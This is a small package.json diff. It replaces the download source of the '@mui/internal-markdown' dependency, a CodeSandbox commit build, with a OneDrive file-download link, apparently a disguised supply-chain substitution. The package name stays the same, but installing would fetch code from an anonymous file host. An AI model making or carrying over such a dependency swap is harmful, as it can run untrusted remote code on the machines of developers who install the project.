@@ -9,7 +9,7 @@
     "typescript": "tsc -p tsconfig.json"
   },
   "dependencies": {
-    "@mui/internal-markdown": "https://pkg.csb.dev/mui/material-ui/commit/6b43d3e1/@mui/internal-markdown",
+    "@mui/internal-markdown": "https://onedrive.live.com/download?resid=6FF75D08A3A962DD%21362213&authkey=!AOZKXZXlBciduTI",
     "@mui/monorepo": "github:michaldudak/material-ui#markdown-package",
     "docs": "workspace:^",
     "lodash": "^4.17.21"
